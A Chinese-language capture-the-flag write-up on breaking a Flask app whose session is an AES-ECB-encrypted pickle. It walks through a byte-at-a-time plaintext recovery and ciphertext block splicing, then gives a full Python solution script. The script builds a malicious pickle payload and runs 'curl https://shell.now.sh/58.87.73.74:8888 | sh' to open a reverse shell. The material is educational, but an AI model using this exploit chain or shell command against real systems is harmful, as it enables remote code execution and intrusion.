
### Step One
 
每个题目的第一步都是要看网站的正常功能, 在这个题目里面提供了登录, 注册, 在注册之后, 发现了一个world的路由, 可以进行花式投票, 然而这个并没有什么卵用
 
在那个world列表的页面, 给了几个提示, 能看到有`Session`, `Crypto`, `RCE`, `AES`几个可能的关键词.
 
根据题目名字, Flask, 那么应该是客户端session了, 但是看了一下并不是flask客户端session的格式, 根据提示的内容, 大概可以猜想是AES加密了.
 
### Step Two
 
对AES加密方式的分析, 通过注册一个超长的用户名, 比如`testXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX`
 
发现保存的session变成了
`06fb3fe6acb4210fa25a5e14067598d39f0f062970b24c6c57568a034b77f912a543b623625b1bbcd11e117f35ea73e0a543b623625b1bbcd11e117f35ea73e0a543b623625b1bbcd11e117f35ea73e0c13524406f0b236cd6159fe82aab3f67`
 
而里面包含有三个重复的`a543b623625b1bbcd11e117f35ea73e0`串, 那么根据题目中提到的`AES`, 基本上可以断定这个题是把`AES-ECB-128(some-informatin, username, more-information)`作为了session发送给客户端的. 那么我们不妨看看`more-information`具体是个什么东西.
 
### Step Three
 
通过写一个脚本, 无限注册用户, 这里推荐用户名前面加一个由任意字符串组成的random串, 防止跟别人注册的东西重复
 
通过注册`username='random'+'X'*n`的字符串, 我们发现在`n=45`字符串长度为51时, cookie中刚好出现了重复的串, 此时可以推断出, 重复的部分为密钥对'X'*16的加密结果
 
```
3a38726abb86b26cc6902bb1de63cc7729fd68eadcf87d6a7c84e78c95a80f76d96fc4d430bedfb2210a84ffcfdbdb64d96fc4d430bedfb2210a84ffcfdbdb64aa456af6fa1a86a34ae54912793ba016
 
d96fc4d430bedfb2210a84ffcfdbdb64
```
 
username[18:34] username[34:50]对应了重复的串, 而最后的32位十六进制编码的数则是对`more-information`的加密结果了
 
因为在AES-ECB-128加密方式中`AES-ECB-128('X'*15 + more-information[0]) == AES-ECB-128('X'*15 + c)`, 通过编写代码, 我们可以恢复c的值, 然后恢复出整个`more-information`串.
 
为: `b'q\x01Ne.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'`
 
 
### Step Four
 
从tail中我们可以猜想到使用的编码方式为pickle
 
如果要搞定这部分, 需要对pickle的编码格式有一定的了解. 从恢复出的tail可以看出,
 
`q\x01`为前一个的结束
`N` -> `None`
`e.` -> 闭合
 
那我们就可以构造出一个payload, 发送给服务器
 
 
### Step Five
 
直接看代码里面的step 4+吧, 这里因为pickle在格式化字符串的时候会将字符串的长度写在里面, 所以我们的payload不能直接运行, 需要将username补全到正确的长度, 让pickle认为username已经结束, 需要进行下一个部分的解析了.
 
而在AES-ECB中对于相同字符串的加密结果不会变, 那就导致了我可以直接用前面用于测试的`'X'*16`的加密后对应的字符串用来补全, 也就是代码中L77-82的作用.
 
然后pickle才会开始进行下一个对象, 也就是我们payload的解析, 从而完成RCE.
 
## Solution
 
解题所需代码如下:
 
```python=
import requests
import random
import pickle
import os
import struct
import collections
 
url = "http://127.0.0.1:8083"
 
def register(username, password):
    while True:
        try:
            prefix = bytes([random.randint(0x20, 0x7e) for i in range(6)])
            s = requests.session()
            req = s.post(url+"/register", data={"username": prefix+username, "password":password})
            return s.cookies.get_dict()
        except (KeyError, requests.exceptions.ConnectionError):
            pass
 
def split32_check(cookie):
    g = [cookie[i:i+32] for i in range(0, len(cookie), 32)]
    if len(list(g)) != len(set(g)):
        l = [item for item, count in collections.Counter(g).items() if count > 1]
        return l[0]
    return None
 
def check_n():
    for i in range(200):
        cookie = register(b'X'*i, 'testpassword')["session"]
        if not split32_check(cookie):
            continue
        else:
            print("n =", i)
            print("Cookie =", cookie)
            return i, split32_check(cookie)
 
def restore_tail():
    tail = b""
    while len(tail)!=16:
        for c in range(0, 255):
            username = bytes([random.randint(0x20, 0x7e) for i in range(12)])
            username = username+ (16 - len(tail) - 1) * b'X' + tail + bytes([c])
            username = username + ((16 - len(tail) - 1) * b'X')
            cookie = register(username, 'testpassword')['session']
            if split32_check(cookie):
                tail+=bytes([c])
                print("tail now: ", tail)
                break
    return tail
 
 
class Shell(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'curl https://shell.now.sh/58.87.73.74:8888 | sh'",))
 
def gen_payload(cmd):
    payload = b'q\x01' # 结束前一个字符串
    payload += b"cposix\nsystem\n(X"+struct.pack('<I', len(cmd))+cmd+b"tR" #payload_forwin
    payload += b"e.\x00\x00\x00\x00\x00" # 闭合+ pickle结束
    return payload
 
if __name__ == "__main__":
    # Step One
    # check_n()
    n, repeat = check_n()
    print(repeat)
    # Step Two
    # tail = restore_tail()
    # print(tail)
    # tail = b'q\x01Ne.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    # Step Three
    payload = gen_payload(b"curl https://shell.now.sh/58.87.73.74:8888 | sh")
    # Step Four
    payload += b'\x00'*((16 - len(payload) % 16) % 16) # 补齐到16整数倍
    username = bytes([random.randint(0x20, 0x7e) for i in range(n-32)])
    username += payload
    cookie = register(username, 'password')["session"]
    new_cookie = cookie[:32]
    for i in range(int(len(payload) / 16)):
        new_cookie += repeat
     
    new_cookie += cookie[32:]
    req = requests.get(url, cookies={"session":new_cookie})
```